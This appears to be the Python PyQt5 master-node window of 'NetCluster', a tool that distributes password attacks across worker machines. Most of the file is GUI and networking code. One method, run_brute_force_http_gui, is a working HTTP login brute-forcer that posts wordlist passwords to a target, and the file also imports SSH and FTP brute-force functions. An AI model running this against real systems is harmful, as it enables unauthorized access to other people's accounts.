import sys
import subprocess
import random
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QWidget, QTextEdit, QGroupBox, QLineEdit, QGridLayout, QStackedWidget, QSlider, QSpinBox, QRadioButton, QButtonGroup, QFileDialog, QComboBox, QFrame, QTableWidget, QTableWidgetItem, QHeaderView, QScrollArea
)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal
from PyQt5.QtGui import QPalette, QColor, QIcon
from netcluster.network.connection import LogBroadcastServer
from netcluster.ui.theme import (
    BG_CARD, BG_INPUT, BG_TERMINAL, ACCENT_CYAN, ACCENT_BLUE, SUCCESS_GREEN, DANGER_RED,
    TEXT_PRIMARY, TEXT_SECONDARY, TEXT_MUTED, BORDER_SUBTLE, TEXT_TERMINAL, TEXT_LOG,
    get_primary_button_style, get_success_button_style, get_danger_button_style, get_secondary_button_style,
    get_groupbox_style, get_input_style, get_terminal_style, get_nav_button_style, get_table_style,
    get_slider_style, get_radio_style, get_global_app_style, FONT_UI, FONT_MONO
)
import socket
import threading
import os
import requests
import argparse
import time
import logging
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
os.environ["QT_SCALE_FACTOR"] = "1"
os.environ["QT_SCREEN_SCALE_FACTORS"] = "1"

from netcluster.core.task_executor import brute_force_http, brute_force_ssh, brute_force_ftp
from netcluster.ui.attack_panel import AttackPanel
from netcluster.core.master_backend import MasterBackend

class MasterNodeWindow(QMainWindow):
    log_brute_signal = pyqtSignal(str)
    brute_done_signal = pyqtSignal(str)
    master_log_signal = pyqtSignal(str)  # Thread-safe: network callbacks -> GUI
    worker_log_signal = pyqtSignal(str, str)  # worker_name, message - Thread-safe worker logs
    worker_connected_signal = pyqtSignal(str, str)  # worker_name, ip - Thread-safe worker connect
    worker_disconnected_signal = pyqtSignal(str)  # worker_name - Thread-safe worker disconnect
    attack_result_signal = pyqtSignal(str)  # Thread-safe: backend attack results -> GUI Attack Results terminal

    def __init__(self):
        super().__init__()
        self.setWindowTitle("NetCluster - Master Node")
        self.setGeometry(300, 100, 1000, 720)
        self.setMinimumSize(880, 620)
        self.pin = self.generate_pin()
        self.selected_attack = None
        self.attack_config = {}
        self.is_attack_running = False
        self.worker_limit = 10
        self.brightness = 100
        self.dark_mode = True
        self.font_size = 13
        self._shutdown_logged = False
        self.log_server = LogBroadcastServer(port=50050)
        self.log_server.on_worker_connected = self._on_worker_connected
        self.log_server.on_worker_disconnected = self._on_worker_disconnected
        self.log_server.on_worker_log = self._on_worker_log_callback
        self.log_server.start_server()
        self.pin_server_thread = threading.Thread(target=self.start_pin_server, daemon=True)
        self.pin_server_thread.start()
        # Initialize master backend
        self.master_backend = MasterBackend()
        self.master_backend.start_server()
        self.setup_ui()
        self.apply_theme()
        self.worker_count_timer = QTimer()
        self.worker_count_timer.timeout.connect(self.update_worker_count)
        self.worker_count_timer.start(1000)
        self.log_brute_signal.connect(self.log_attack)
        self.brute_done_signal.connect(self.log_attack)
        self.master_log_signal.connect(self._append_master_log)
        self.worker_log_signal.connect(self._on_worker_log_received)
        self.worker_connected_signal.connect(self._on_worker_connected_ui)
        self.worker_disconnected_signal.connect(self._on_worker_disconnected_ui)
        self.attack_result_signal.connect(self.log_attack)
        # Wire backend attack result callback (thread-safe via signal)
        self.master_backend.on_attack_result = lambda msg: self.attack_result_signal.emit(msg)
        # Log master startup (after UI is ready)
        QTimer.singleShot(0, lambda: self.master_log("Master node started"))

    def setup_ui(self):
        central = QWidget()
        self.setStyleSheet(f"background-color: {BG_CARD}; font-family: {FONT_UI};")
        self.main_layout = QVBoxLayout(central)
        self.main_layout.setSpacing(16)
        # --- Navbar: Logo, PIN badge, Worker stat, Section Buttons, Back/Exit ---
        navbar = QHBoxLayout()
        navbar.setSpacing(16)
        # Logo
        logo = QLabel("◉")
        logo.setStyleSheet(f"font-size: 24px; color: {ACCENT_CYAN};")
        logo.setToolTip("NetCluster Master Node")
        navbar.addWidget(logo, alignment=Qt.AlignLeft)
        # PIN badge with copy
        pin_frame = QFrame()
        pin_frame.setStyleSheet(f"background: {BG_INPUT}; border: 1px solid {BORDER_SUBTLE}; border-radius: 10px; padding: 4px 12px;")
        pin_row = QHBoxLayout(pin_frame)
        pin_row.setSpacing(8)
        self.pin_label = QLabel(f"<span style='color:{TEXT_MUTED}; font-size:12px;'>PIN</span> <b style='color:{ACCENT_CYAN}; font-size:16px; font-family:{FONT_MONO};'>{self.pin}</b>")
        self.pin_label.setToolTip("Connection PIN for workers")
        pin_row.addWidget(self.pin_label)
        copy_pin_btn = QPushButton("Copy")
        copy_pin_btn.setStyleSheet(get_secondary_button_style() + " QPushButton { padding: 4px 12px; font-size: 12px; }")
        copy_pin_btn.setToolTip("Copy PIN to clipboard")
        copy_pin_btn.clicked.connect(lambda: QApplication.clipboard().setText(self.pin))
        pin_row.addWidget(copy_pin_btn)
        regen_btn = QPushButton("Regenerate")
        regen_btn.setStyleSheet(get_secondary_button_style() + " QPushButton { padding: 4px 12px; font-size: 12px; }")
        regen_btn.setToolTip("Generate a new connection PIN")
        regen_btn.clicked.connect(self.regenerate_pin)
        pin_row.addWidget(regen_btn)
        navbar.addWidget(pin_frame, alignment=Qt.AlignLeft)
        # Worker count stat card
        self.worker_count_label = QLabel("Workers: 0")
        self.worker_count_label.setStyleSheet(f"font-size: 15px; color: {SUCCESS_GREEN}; font-weight: 600; background: rgba(16,185,129,0.12); border: 1px solid {SUCCESS_GREEN}; border-radius: 10px; padding: 8px 16px;")
        self.worker_count_label.setToolTip("Number of connected Worker Nodes")
        navbar.addWidget(self.worker_count_label, alignment=Qt.AlignLeft)
        navbar.addStretch()
        # Section buttons
        self.attacks_btn = QPushButton("Attacks")
        self.attacks_btn.setCheckable(True)
        self.attacks_btn.setChecked(True)
        self.attacks_btn.setStyleSheet(get_nav_button_style(True))
        self.attacks_btn.setToolTip("Available attack types")
        self.attacks_btn.clicked.connect(lambda: self.show_section(0))
        navbar.addWidget(self.attacks_btn)
        self.dashboard_btn = QPushButton("Dashboard")
        self.dashboard_btn.setCheckable(True)
        self.dashboard_btn.setChecked(False)
        self.dashboard_btn.setStyleSheet(get_nav_button_style(False))
        self.dashboard_btn.setToolTip("Configure and launch attacks")
        self.dashboard_btn.clicked.connect(lambda: self.show_section(1))
        navbar.addWidget(self.dashboard_btn)
        self.settings_btn = QPushButton("Settings")
        self.settings_btn.setCheckable(True)
        self.settings_btn.setChecked(False)
        self.settings_btn.setStyleSheet(get_nav_button_style(False))
        self.settings_btn.setToolTip("Application settings")
        self.settings_btn.clicked.connect(lambda: self.show_section(2))
        navbar.addWidget(self.settings_btn)
        self.workers_btn = QPushButton("Workers")
        self.workers_btn.setCheckable(True)
        self.workers_btn.setChecked(False)
        self.workers_btn.setStyleSheet(get_nav_button_style(False))
        self.workers_btn.setToolTip("Connected worker nodes")
        self.workers_btn.clicked.connect(lambda: self.show_section(3))
        navbar.addWidget(self.workers_btn)
        self.workers_dashboard_btn = QPushButton("Workers Dashboard")
        self.workers_dashboard_btn.setCheckable(True)
        self.workers_dashboard_btn.setChecked(False)
        self.workers_dashboard_btn.setStyleSheet(get_nav_button_style(False))
        self.workers_dashboard_btn.setToolTip("Live execution logs for workers")
        self.workers_dashboard_btn.clicked.connect(lambda: self.show_section(4))
        navbar.addWidget(self.workers_dashboard_btn)
        
        # Ray Status Button
        self.ray_status_btn = QPushButton("Ray Status")
        self.ray_status_btn.setCheckable(True)
        self.ray_status_btn.setChecked(False)
        self.ray_status_btn.setStyleSheet(get_nav_button_style(False))
        self.ray_status_btn.setToolTip("View Ray execution cluster status")
        self.ray_status_btn.clicked.connect(lambda: self.show_section(5))
        navbar.addWidget(self.ray_status_btn)
        
        navbar.addStretch()
        back_btn = QPushButton("Back")
        back_btn.setStyleSheet(get_secondary_button_style())
        back_btn.setToolTip("Return to launcher")
        back_btn.clicked.connect(self.go_back)
        navbar.addWidget(back_btn, alignment=Qt.AlignRight)
        exit_btn = QPushButton("Exit")
        exit_btn.setStyleSheet(get_danger_button_style() + " QPushButton { padding: 8px 16px; }")
        exit_btn.setToolTip("Close application")
        exit_btn.clicked.connect(self.close)
        navbar.addWidget(exit_btn, alignment=Qt.AlignRight)
        self.main_layout.addLayout(navbar)
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"background: {BORDER_SUBTLE}; max-height: 1px;")
        self.main_layout.addWidget(sep)
        self.sections = QStackedWidget()
        # Initialize attack panel controllers
        self.attack_panel = AttackPanel(self.master_backend, self)
        
        # Section 0: Available Attacks Configuration
        self.sections.addWidget(self.attack_panel.config_widget)
        
        # Section 1: Dashboard Monitoring
        self.sections.addWidget(self.attack_panel.monitor_widget)
        settings_widget = QWidget()
        settings_layout = QVBoxLayout(settings_widget)
        settings_layout.setSpacing(16)
        try:
            ip_addr = socket.gethostbyname(socket.gethostname())
        except Exception:
            ip_addr = '127.0.0.1'
        ip_label = QLabel(f"MasterNode IP: <b style='color:{ACCENT_CYAN}; font-family:{FONT_MONO};'>{ip_addr}</b>")
        ip_label.setStyleSheet(f"font-size: 15px; color: {TEXT_PRIMARY}; background: {BG_INPUT}; border: 1px solid {BORDER_SUBTLE}; border-radius: 10px; padding: 12px 16px; font-family: {FONT_UI};")
        ip_label.setToolTip("IP address for WorkerNodes to connect. Use the correct interface for your network.")
        settings_layout.addWidget(ip_label)
        theme_label = QLabel("Theme Mode")
        theme_label.setStyleSheet(f"font-size: 14px; font-weight: 600; color: {TEXT_PRIMARY};")
        settings_layout.addWidget(theme_label)
        self.dark_radio = QRadioButton("Dark Mode")
        self.light_radio = QRadioButton("Light Mode")
        self.dark_radio.setChecked(self.dark_mode)
        self.light_radio.setChecked(not self.dark_mode)
        for r in (self.dark_radio, self.light_radio):
            r.setStyleSheet(get_radio_style())
        theme_group = QButtonGroup(settings_widget)
        theme_group.addButton(self.dark_radio)
        theme_group.addButton(self.light_radio)
        theme_row = QHBoxLayout()
        theme_row.addWidget(self.dark_radio)
        theme_row.addWidget(self.light_radio)
        settings_layout.addLayout(theme_row)
        self.dark_radio.toggled.connect(self.toggle_theme)
        self.light_radio.toggled.connect(self.toggle_theme)
        bright_label = QLabel("Screen Brightness")
        bright_label.setStyleSheet(f"font-size: 14px; font-weight: 600; color: {TEXT_PRIMARY};")
        settings_layout.addWidget(bright_label)
        self.bright_slider = QSlider(Qt.Horizontal)
        self.bright_slider.setMinimum(30)
        self.bright_slider.setMaximum(100)
        self.bright_slider.setValue(self.brightness)
        self.bright_slider.setStyleSheet(get_slider_style())
        self.bright_slider.valueChanged.connect(self.change_brightness)
        settings_layout.addWidget(self.bright_slider)
        font_label = QLabel("Font Size")
        font_label.setStyleSheet(f"font-size: 14px; font-weight: 600; color: {TEXT_PRIMARY};")
        settings_layout.addWidget(font_label)
        self.font_spin = QSpinBox()
        self.font_spin.setMinimum(8)
        self.font_spin.setMaximum(32)
        self.font_spin.setValue(self.font_size)
        self.font_spin.setStyleSheet(get_input_style())
        self.font_spin.valueChanged.connect(self.set_font_size)
        settings_layout.addWidget(self.font_spin)
        worker_label = QLabel("Worker Connection Limit")
        worker_label.setStyleSheet(f"font-size: 14px; font-weight: 600; color: {TEXT_PRIMARY};")
        settings_layout.addWidget(worker_label)
        self.worker_spin = QSpinBox()
        self.worker_spin.setMinimum(1)
        self.worker_spin.setMaximum(100)
        self.worker_spin.setValue(self.worker_limit)
        self.worker_spin.setStyleSheet(get_input_style())
        self.worker_spin.valueChanged.connect(self.set_worker_limit)
        settings_layout.addWidget(self.worker_spin)
        
        # Ray Master CPUs
        ray_cpu_label = QLabel("Master Node Ray CPUs (Restart Required)")
        ray_cpu_label.setStyleSheet(f"font-size: 14px; font-weight: 600; color: {TEXT_PRIMARY};")
        settings_layout.addWidget(ray_cpu_label)
        
        cpu_layout = QHBoxLayout()
        self.master_cpu_spin = QSpinBox()
        self.master_cpu_spin.setRange(0, 128)
        self.master_cpu_spin.setValue(2)
        self.master_cpu_spin.setToolTip("Set to 0 to act as pure controller. >0 to contribute to attack tasks.")
        self.master_cpu_spin.setStyleSheet(get_input_style())
        cpu_layout.addWidget(self.master_cpu_spin)
        
        self.apply_cpu_btn = QPushButton("Restart Ray Head")
        self.apply_cpu_btn.setStyleSheet(get_primary_button_style())
        self.apply_cpu_btn.clicked.connect(self._restart_ray_head)
        cpu_layout.addWidget(self.apply_cpu_btn)
        
        settings_layout.addLayout(cpu_layout)
        
        settings_layout.addStretch()
        self.sections.addWidget(settings_widget)
        
        workers_widget = QWidget()
        workers_layout = QVBoxLayout(workers_widget)
        workers_group = QGroupBox("Connected Worker Nodes")
        workers_group.setStyleSheet(get_groupbox_style(SUCCESS_GREEN, SUCCESS_GREEN))
        workers_group_layout = QVBoxLayout(workers_group)
        self.workers_table = QTableWidget()
        self.workers_table.setColumnCount(4)
        self.workers_table.setHorizontalHeaderLabels(["Worker Name", "IP Address", "Tasks Assigned", "Status"])
        self.workers_table.setStyleSheet(get_table_style())
        header = self.workers_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        self.workers_table.verticalHeader().setDefaultSectionSize(44)
        self.workers_table.verticalHeader().setVisible(False)
        workers_group_layout.addWidget(self.workers_table)
        workers_controls_layout = QHBoxLayout()
        refresh_btn = QPushButton("Refresh")
        refresh_btn.setStyleSheet(get_primary_button_style())
        refresh_btn.setToolTip("Refresh worker nodes list")
        refresh_btn.clicked.connect(self.refresh_workers_table)
        workers_controls_layout.addWidget(refresh_btn)
        disconnect_btn = QPushButton("Disconnect Selected")
        disconnect_btn.setStyleSheet(get_danger_button_style())
        disconnect_btn.setToolTip("Disconnect selected worker node")
        disconnect_btn.clicked.connect(self.disconnect_selected_worker)
        workers_controls_layout.addWidget(disconnect_btn)
        workers_controls_layout.addStretch()
        self.workers_stats_label = QLabel("Total: 0 | Active: 0 | Tasks: 0")
        self.workers_stats_label.setStyleSheet(f"font-size: 13px; color: {SUCCESS_GREEN}; font-weight: 600; background: {BG_INPUT}; border-radius: 8px; padding: 10px 16px; font-family: {FONT_UI};")
        workers_controls_layout.addWidget(self.workers_stats_label)
        workers_group_layout.addLayout(workers_controls_layout)
        workers_layout.addWidget(workers_group)
        workers_layout.addStretch()
        self.sections.addWidget(workers_widget)
        
        # Workers Dashboard page - Live execution logs
        from netcluster.ui.worker_dashboard import WorkersDashboardPage
        self.workers_dashboard_page = WorkersDashboardPage()
        self.sections.addWidget(self.workers_dashboard_page)
        
        # Ray Status page - Live cluster monitoring
        from netcluster.ui.ray_status import RayStatusPage
        self.ray_status_page = RayStatusPage(self.master_backend)
        self.sections.addWidget(self.ray_status_page)
        
        self.main_layout.addWidget(self.sections, stretch=3)
        # --- Terminals container (only visible on Dashboard) ---
        self.terminals_sep = QFrame()
        self.terminals_sep.setFrameShape(QFrame.HLine)
        self.terminals_sep.setStyleSheet(f"background: {BORDER_SUBTLE}; max-height: 1px;")
        self.main_layout.addWidget(self.terminals_sep)
        self.terminals_container = QWidget()
        terminals_layout = QHBoxLayout(self.terminals_container)
        terminals_layout.setContentsMargins(0, 0, 0, 0)
        terminals_layout.setSpacing(16)
        # LEFT: Master Node Logs
        log_group = QGroupBox("Master Node Logs / Activity")
        log_group.setStyleSheet(get_groupbox_style(TEXT_LOG, "#f59e0b"))
        log_layout = QVBoxLayout(log_group)
        log_header = QHBoxLayout()
        log_header.addStretch()
        export_logs_btn = QPushButton("Export Logs")
        export_logs_btn.setStyleSheet(get_secondary_button_style() + " QPushButton { padding: 6px 12px; font-size: 12px; }")
        export_logs_btn.setToolTip("Export master logs to file")
        export_logs_btn.clicked.connect(self._export_master_logs)
        log_header.addWidget(export_logs_btn)
        log_layout.addLayout(log_header)
        self.log_terminal = QTextEdit()
        self.log_terminal.setReadOnly(True)
        self.log_terminal.setStyleSheet(get_terminal_style(TEXT_LOG, self.font_size))
        log_layout.addWidget(self.log_terminal)
        terminals_layout.addWidget(log_group, stretch=1)
        # RIGHT: Attack Results
        attack_group = QGroupBox("Attack Results")
        attack_group.setStyleSheet(get_groupbox_style(TEXT_TERMINAL, SUCCESS_GREEN))
        attack_layout = QVBoxLayout(attack_group)
        self.attack_terminal = QTextEdit()
        self.attack_terminal.setReadOnly(True)
        self.attack_terminal.setStyleSheet(get_terminal_style(TEXT_TERMINAL, self.font_size))
        attack_layout.addWidget(self.attack_terminal)
        terminals_layout.addWidget(attack_group, stretch=1)
        self.main_layout.addWidget(self.terminals_container, stretch=2)
        # Initially hidden (Attacks page is shown first)
        self.terminals_container.setVisible(False)
        self.terminals_sep.setVisible(False)
        # Status bar
        self.status_bar = QFrame()
        self.status_bar.setFixedHeight(26)
        self.status_bar.setStyleSheet(f"background: {BG_INPUT}; border-top: 1px solid {BORDER_SUBTLE};")
        status_layout = QHBoxLayout(self.status_bar)
        status_layout.setContentsMargins(16, 4, 16, 4)
        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet(f"font-size: 11px; color: {TEXT_MUTED};")
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()
        self.status_version = QLabel("NetCluster v1.0")
        self.status_version.setStyleSheet(f"font-size: 11px; color: {TEXT_MUTED};")
        status_layout.addWidget(self.status_version)
        self.main_layout.addWidget(self.status_bar)
        self.setCentralWidget(central)

    def show_section(self, idx):
        self.sections.setCurrentIndex(idx)
        btns = [self.attacks_btn, self.dashboard_btn, self.settings_btn, self.workers_btn, self.workers_dashboard_btn, self.ray_status_btn]
        sections = ["Attacks", "Dashboard", "Settings", "Workers", "Workers Dashboard", "Ray Status"]
        for i, b in enumerate(btns):
            b.setChecked(i == idx)
            b.setStyleSheet(get_nav_button_style(i == idx))
        if hasattr(self, 'status_label'):
            self.status_label.setText(f"Viewing: {sections[idx]}")
        
        # Show terminals ONLY on Dashboard (section 1)
        if idx == 1:
            if hasattr(self, 'terminals_container'):
                self.terminals_container.setVisible(True)
            if hasattr(self, 'terminals_sep'):
                self.terminals_sep.setVisible(True)
        else:
            if hasattr(self, 'terminals_container'):
                self.terminals_container.setVisible(False)
            if hasattr(self, 'terminals_sep'):
                self.terminals_sep.setVisible(False)
        
        # Refresh specific pages when viewed
        if idx == 3:
            self.refresh_workers_table()
        elif idx == 4:
            self._refresh_workers_dashboard()
        elif idx == 5:
            if hasattr(self, 'ray_status_page'):
                self.ray_status_page.update_status()

    def generate_pin(self):
        return str(random.randint(100000, 999999))

    def _on_worker_connected(self, name: str, ip: str):
        """Called from network thread when worker connects. Emit signal for GUI thread."""
        self.master_log_signal.emit(f'Worker "{name}" connected')
        # Emit signal for workers dashboard
        self.worker_connected_signal.emit(name, ip)

    def _on_worker_disconnected(self, name: str, ip: str):
        """Called from network thread when worker disconnects. Emit signal for GUI thread."""
        self.master_log_signal.emit(f'Worker "{name}" disconnected')
        # Emit signal for workers dashboard
        self.worker_disconnected_signal.emit(name)
    
    def _on_worker_log_callback(self, worker_name: str, message: str):
        """Called from network thread when worker sends log. Emit signal for GUI thread."""
        self.worker_log_signal.emit(worker_name, message)
    
    def _on_worker_log_received(self, worker_name: str, message: str):
        """Slot: Handle worker log (runs in GUI thread)."""
        if hasattr(self, 'workers_dashboard_page'):
            from datetime import datetime
            timestamp = datetime.now().strftime("%H:%M:%S")
            formatted_message = f"<span style='color:{TEXT_TERMINAL};'>[{timestamp}]</span> {message}"
            self.workers_dashboard_page.append_worker_log(worker_name, formatted_message)
    
    def _on_worker_connected_ui(self, worker_name: str, worker_ip: str):
        """Slot: Handle worker connected (runs in GUI thread)."""
        if hasattr(self, 'workers_dashboard_page'):
            self.workers_dashboard_page.add_worker_card(worker_name, worker_ip)
            # Add connection log
            from datetime import datetime
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.workers_dashboard_page.append_worker_log(
                worker_name,
                f"<span style='color:{SUCCESS_GREEN};'>[{timestamp}] Connected</span>"
            )
    
    def _on_worker_disconnected_ui(self, worker_name: str):
        """Slot: Handle worker disconnected (runs in GUI thread)."""
        if hasattr(self, 'workers_dashboard_page'):
            self.workers_dashboard_page.remove_worker_card(worker_name)
            # Add disconnection log
            from datetime import datetime
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.workers_dashboard_page.append_worker_log(
                worker_name,
                f"<span style='color:{DANGER_RED};'>[{timestamp}] Disconnected</span>"
            )
    
    def _refresh_workers_dashboard(self):
        """Refresh workers dashboard with current connected workers"""
        if hasattr(self, 'workers_dashboard_page'):
            worker_info = self.log_server.get_worker_info()
            for client, info in worker_info.items():
                worker_name = info.get('name', 'Unknown')
                worker_ip = info.get('ip', 'unknown')
                self.workers_dashboard_page.add_worker_card(worker_name, worker_ip)

    def _append_master_log(self, msg: str):
        """Slot: add master log (runs in GUI thread)."""
        formatted = self.log_server.add_master_log(msg)
        if hasattr(self, 'log_terminal'):
            self.log_terminal.append(formatted)

    def master_log(self, msg: str):
        """Add a master-only log entry. Format: [HH:MM:SS] [MASTER] <msg>"""
        formatted = self.log_server.add_master_log(msg)
        if hasattr(self, 'log_terminal'):
            self.log_terminal.append(formatted)

    def _export_master_logs(self):
        """Export master logs to file"""
        fname, _ = QFileDialog.getSaveFileName(self, "Export Master Logs", "master_logs.txt", "Text Files (*.txt);;All Files (*)")
        if fname:
            try:
                with open(fname, 'w', encoding='utf-8') as f:
                    f.write(self.log_terminal.toPlainText())
                if hasattr(self, 'status_label'):
                    self.status_label.setText(f"Logs exported to {fname}")
                    QTimer.singleShot(3000, lambda: self.status_label.setText("Ready"))
            except Exception as e:
                if hasattr(self, 'status_label'):
                    self.status_label.setText(f"Export failed: {e}")

    def start_pin_server(self):
        # TCP server for PIN check (port 50051)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', 50051))
        s.listen(5)
        while True:
            try:
                client, addr = s.accept()
                threading.Thread(target=self.handle_pin_client, args=(client,), daemon=True).start()
            except Exception:
                break
    def handle_pin_client(self, client):
        try:
            data = client.recv(32)
            pin = data.decode('utf-8').strip()
            if pin == self.pin:
                client.sendall(b'OK')
            else:
                client.sendall(b'FAIL')
        except Exception:
            pass
        finally:
            client.close()

    def deploy_attack(self, attack_type):
        self.selected_attack = attack_type
        # Switch to Dashboard (Section 1) which holds AttackPanel
        self.show_section(1)
        
    def show_attack_config(self, attack_type):
        # Deprecated: configuration is now handled inside AttackPanel
        pass

    def browse_wordlist(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)")
        if fname:
            self.bf_wordlist.setText(fname)

    def start_attack(self):
        # Deprecated: start_attack is now handled inside AttackPanel
        pass
        
    def run_brute_force_http_gui(self, target, port, username, wordlist, timeout, success_indicator):
        # Deprecated
        pass
        
    def stop_attack(self):
        # Deprecated: stop_attack is now handled inside AttackPanel
        pass

    def distribute_tasks(self):
        # Deprecated: now handled automatically by framework
        pass

    def simulate_log_update(self):
        pass

    def run_brute_force_http_gui(self, target, port, username, wordlist, timeout, success_indicator):
        import requests
        from time import sleep
        if not target.startswith("http"):
            url = f"http://{target}"
        else:
            url = target
        if port:
            proto, rest = url.split('://', 1)
            if ':' not in rest.split('/')[0]:
                url = f"{proto}://{rest.split('/')[0]}:{port}/{'/'.join(rest.split('/')[1:])}"
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log_brute_signal.emit(f"[ERROR] Could not open wordlist: {e}")
            return
        session = requests.Session()
        username_field = 'username'
        password_field = 'password'
        found = False
        for password in passwords:
            if not self.is_attack_running:
                self.log_brute_signal.emit("[INFO] Attack stopped by user.")
                return
            data = {username_field: username, password_field: password}
            try:
                resp = session.post(url, data=data, timeout=timeout)
            except Exception as e:
                self.log_brute_signal.emit(f"[ERROR] {username}:{password} - {e}")
                continue
            if success_indicator:
                if success_indicator in resp.text:
                    self.log_brute_signal.emit(f"trying password - {password} passed")
                    found = True
                    break
                else:
                    self.log_brute_signal.emit(f"trying password - {password} failed")
            else:
                if not ("invalid" in resp.text.lower() or "incorrect" in resp.text.lower()):
                    self.log_brute_signal.emit(f"trying password - {password} passed")
                    found = True
                    break
                else:
                    self.log_brute_signal.emit(f"trying password - {password} failed")
            sleep(0.5)
        if not found:
            self.brute_done_signal.emit("No password found.")
        else:
            self.brute_done_signal.emit("Brute force complete.")

    def stop_attack(self):
        if not self.is_attack_running:
            return
        self.is_attack_running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.distribute_btn.setEnabled(False)
        self.log_attack(f"[Attack '{self.selected_attack}' stopped]")
        if hasattr(self, 'simulate_log_timer'):
            self.simulate_log_timer.stop()

    def distribute_tasks(self):
        """Distribute attack tasks to connected worker nodes"""
        if not hasattr(self, 'selected_attack') or not self.selected_attack:
            return
        self.distribute_btn.setEnabled(False)
        import random
        worker_count = random.randint(1, 5)
        if worker_count == 0:
            self.distribute_btn.setEnabled(True)
            return
        # Simulate task distribution (no logging - per requirements)
        QTimer.singleShot(3000, lambda: self.distribute_btn.setEnabled(True))

    def simulate_log_update(self):
        if self.is_attack_running:
            import random
            msg = random.choice([
                "[INFO] Attempting connection...",
                "[INFO] Sending packets...",
                "[INFO] Brute force attempt...",
                "[INFO] Worker node responded.",
                "[INFO] Progress update...",
                "[INFO] Checking credentials...",
                "[INFO] Attack in progress..."
            ])
            self.log_attack(msg)

    def log_attack(self, msg):
        from datetime import datetime
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.attack_terminal.append(f"<span style='color:{TEXT_TERMINAL};'>[{timestamp}]</span> {msg}")

    def go_back(self):
        subprocess.Popen([sys.executable, "-m", "netcluster.ui.app"])
        self.close()

    def closeEvent(self, event):
        if not self._shutdown_logged:
            self._shutdown_logged = True
            self.master_log("Master node shutdown")
        self.log_server.stop()
        event.accept()

    def toggle_theme(self):
        self.dark_mode = self.dark_radio.isChecked()
        self.apply_theme()
        # Broadcast theme change to workers
        theme = 'dark' if self.dark_mode else 'light'
        self.log_server.broadcast_log(f"[SETTINGS] theme={theme}")

    def apply_theme(self):
        palette = QPalette()
        if self.dark_mode:
            palette.setColor(QPalette.Window, QColor(22, 27, 34))
            palette.setColor(QPalette.WindowText, Qt.white)
            palette.setColor(QPalette.Base, QColor(33, 38, 45))
            palette.setColor(QPalette.AlternateBase, QColor(39, 45, 54))
            palette.setColor(QPalette.ToolTipBase, Qt.white)
            palette.setColor(QPalette.ToolTipText, Qt.white)
            palette.setColor(QPalette.Text, Qt.white)
            palette.setColor(QPalette.Button, QColor(33, 38, 45))
            palette.setColor(QPalette.ButtonText, Qt.white)
            palette.setColor(QPalette.BrightText, Qt.red)
            palette.setColor(QPalette.Highlight, QColor(59, 130, 246))
            palette.setColor(QPalette.HighlightedText, Qt.black)
            self.setStyleSheet(f"background-color: {BG_CARD};")
            if hasattr(self, 'attack_terminal'):
                self.attack_terminal.setStyleSheet(get_terminal_style(TEXT_TERMINAL, self.font_size))
            if hasattr(self, 'log_terminal'):
                self.log_terminal.setStyleSheet(get_terminal_style(TEXT_LOG, self.font_size))
        else:
            palette = QApplication.style().standardPalette()
            self.setStyleSheet("background-color: #f1f5f9;")
            if hasattr(self, 'attack_terminal'):
                self.attack_terminal.setStyleSheet(get_terminal_style("#059669", self.font_size).replace(BG_TERMINAL, "#ffffff"))
            if hasattr(self, 'log_terminal'):
                self.log_terminal.setStyleSheet(get_terminal_style("#b45309", self.font_size).replace(BG_TERMINAL, "#f8fafc"))
        self.setPalette(palette)
        self.update_brightness()

    def change_brightness(self, value):
        self.brightness = value
        self.update_brightness()
        # Broadcast brightness change to workers
        self.log_server.broadcast_log(f"[SETTINGS] brightness={self.brightness}")

    def update_brightness(self):
        # Adjust window opacity for brightness effect
        self.setWindowOpacity(self.brightness / 100)

    def set_worker_limit(self, value):
        self.worker_limit = value
        self.log_server.broadcast_log(f"[SETTINGS] worker_limit={self.worker_limit}")

    def _restart_ray_head(self):
        cpus = self.master_cpu_spin.value()
        self.master_log(f"Applying new Ray CPU configuration: {cpus}")
        self.apply_cpu_btn.setEnabled(False)
        self.apply_cpu_btn.setText("Restarting...")
        QApplication.processEvents()
        
        success = self.master_backend.restart_ray(cpus)
        
        if success:
            self.master_log("Ray cluster successfully restarted with new CPU limits.")
        else:
            self.master_log("Failed to restart Ray cluster. Check logs.")
            
        self.apply_cpu_btn.setText("Restart Ray Head")
        self.apply_cpu_btn.setEnabled(True)

    def set_font_size(self, value):
        self.font_size = value
        self.attack_terminal.setStyleSheet(get_terminal_style(TEXT_TERMINAL, value))
        self.log_terminal.setStyleSheet(get_terminal_style(TEXT_LOG, value))
        # Broadcast font size to workers
        self.log_server.broadcast_log(f"[SETTINGS] font_size={self.font_size}")

    def update_worker_count(self):
        worker_info = self.log_server.get_worker_info()
        count = len(worker_info)
        self.worker_count_label.setText(f"Workers: {count}")
        # Also refresh the worker table if we're on the worker nodes section
        if self.sections.currentIndex() == 3:
            self.refresh_workers_table()
        # Update task counts in workers dashboard
        if hasattr(self, 'workers_dashboard_page') and self.sections.currentIndex() == 4:
            for client, info in worker_info.items():
                worker_name = info.get('name', 'Unknown')
                task_count = info.get('tasks', 0)
                self.workers_dashboard_page.update_worker_task_count(worker_name, task_count)

    def regenerate_pin(self):
        self.pin = self.generate_pin()
